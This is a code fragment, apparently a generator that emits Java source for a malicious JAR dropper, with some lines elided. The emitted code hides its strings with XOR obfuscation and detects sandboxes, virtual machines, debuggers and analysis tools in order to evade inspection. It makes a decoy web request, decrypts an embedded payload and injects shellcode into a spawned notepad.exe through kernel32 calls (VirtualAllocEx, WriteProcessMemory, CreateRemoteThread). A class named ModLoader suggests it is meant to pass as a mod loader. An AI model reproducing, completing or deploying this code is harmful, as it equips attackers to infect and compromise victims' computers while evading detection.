...
function generateJarDropperSource(): string {
  return [
    ...
    "  private static String x(int[]a,int k){byte[]b=new byte[a.length];for(int i=0;i<a.length;i++)b[i]=(byte)(a[i]^k);try{return new String(b,\"UTF-8\");}catch(Exception e){return \"\";}}",
    ...
    "  private static boolean isAnalysisEnv(){",
    "    try{",
    "      List<String> args=ManagementFactory.getRuntimeMXBean().getInputArguments();",
    "      for(String a:args)if(a.contains(x(new int[]{114,104,110,108,113,101,105,107,115,123,107,101,118,111},11)))return true;",
    "      if(Runtime.getRuntime().availableProcessors()<2)return true;",
    "      String os=System.getProperty(\"os.name\").toLowerCase();",
    "      if(os.contains(\"win\")){",
    "        String[] vf={x(new int[]{34,123,118,104,111,101,118,111,114,123,58,120,114,115,100,108,50,51,123,37,115,104,118,104,114,114,58,123,53,113,110,121,44,110,116,114,100,53,114,120,114},11),x(new int[]{34,123,118,104,111,101,118,111,114,123,58,120,114,115,100,108,50,51,123,37,115,104,118,104,114,114,58,123,119,108,117,110,110,109,114,101,53,100,121,100},11)};",
    "        for(String f:vf)if(new File(f).exists())return true;",
    "        Process p=Runtime.getRuntime().exec(x(new int[]{117,96,114,106,109,104,114,117},11));",
    "        BufferedReader r=new BufferedReader(new InputStreamReader(p.getInputStream()));",
    "        String l;String[] t={x(new int[]{120,106,115,102,114,105,106,115,104},11),x(new int[]{113,115,110,100,102,114,114,105,106,104,108,102,115},11),x(new int[]{121,55,101,103,105,104},11)};",
    "        while((l=r.readLine())!=null){l=l.toLowerCase();for(String s:t)if(l.contains(s))return true;}",
    "      }",
    "    }catch(Exception e){}",
    "    return false;",
    "  }",
    "  private static void fakeNet(){",
    "    try{",
    "      URL u=new URL(x(new int[]{111,123,123,119,114,51,123,123,102,113,106,53,104,106,117,105,116,101,53,100,110,108,123,115,102,113,110,114,123,39,102,105,115,106,104,102,114,123,103,102,105,115,106,104,123,115,102,113,106,101,114,106,114,123,109,102,117,106,114,115},11));",
    "      HttpURLConnection c=(HttpURLConnection)u.openConnection();",
    "      c.setRequestMethod(\"GET\");",
    "      c.setRequestProperty(\"User-Agent\",x(new int[]{44,110,123,108,113,113,102,58,52,43,48,123,40,44,104,110,105,110,118,114,123,45,53,123,58,123,44,104,110,105,110,118,114,123,121,55,51,123,121,55,51,41,123,39,102,105,115,106,104,44,110,101,111,114,110,102,105,106,115,123,50,53,43},11));",
    "      c.setConnectTimeout(5000);c.setReadTimeout(5000);c.getResponseCode();",
    "    }catch(Exception e){}",
    "  }",
    "  private static void run()throws Exception{",
    "    if(!RAN.compareAndSet(false,true))return;",
    "    if(isAnalysisEnv())return;",
    "    fakeNet();",
    ...
    "    InputStream is=ModLoader.class.getResourceAsStream(x(new int[]{117,59,41,41,63,46,41,117,62,59,46,59,116,42,59,49},90));",
    "    if(is==null)return;",
    "    ByteArrayOutputStream buf=new ByteArrayOutputStream();",
    "    byte[]tmp=new byte[4096];int n;while((n=is.read(tmp))!=-1)buf.write(tmp,0,n);is.close();",
    "    byte[]raw=buf.toByteArray();int key=raw[0]&0xFF;byte[]xd=new byte[raw.length-1];",
    ...
    "    Class<?>FC=Class.forName(x(new int[]{57,53,55,116,41,47,52,116,48,52,59,116,28,47,52,57,46,51,53,52},90));",
    "    Class<?>PC=Class.forName(x(new int[]{57,53,55,116,41,47,52,116,48,52,59,116,10,53,51,52,46,63,40},90));",
    "    Class<?>MC=Class.forName(x(new int[]{57,53,55,116,41,47,52,116,48,52,59,116,23,63,55,53,40,35},90));",
    "    java.lang.reflect.Method gf=FC.getMethod(x(new int[]{61,63,46,28,47,52,57,46,51,53,52},90),String.class,String.class);",
    ...
    "    java.lang.reflect.Method clr=MC.getMethod(\"clear\");",
    ...
    "    Object fCPA=gf.invoke(null,x(new int[]{49,63,40,52,63,54,105,104},90),x(new int[]{25,40,63,59,46,63,10,40,53,57,63,41,41,27},90));",
    "    String sysRoot=System.getenv(x(new int[]{9,35,41,46,63,55,8,53,53,46},90));",
    "    if(sysRoot==null||sysRoot.isEmpty())sysRoot=\"C:\\\\Windows\";",
    "    String tgtExe=x(new int[]{52,53,46,63,42,59,62,116,63,34,63},90);",
    ...
    "    Object fVA=gf.invoke(null,x(new int[]{49,63,40,52,63,54,105,104},90),x(new int[]{12,51,40,46,47,59,54,27,54,54,53,57,31,34},90));",
    "    Object ra=iv.invoke(fVA,PC,new Object[]{hProc,NP,(long)sc.length,0x3000,0x40});",
    "    if(ra==null||ra.equals(NP))return;",
    "    Object fWM=gf.invoke(null,x(new int[]{49,63,40,52,63,54,105,104},90),x(new int[]{13,40,51,46,63,10,40,53,57,63,41,41,23,63,55,53,40,35},90));",
    ...
    "    Object fCT=gf.invoke(null,x(new int[]{49,63,40,52,63,54,105,104},90),x(new int[]{25,40,63,59,46,63,8,63,55,53,46,63,14,50,40,63,59,62},90));",
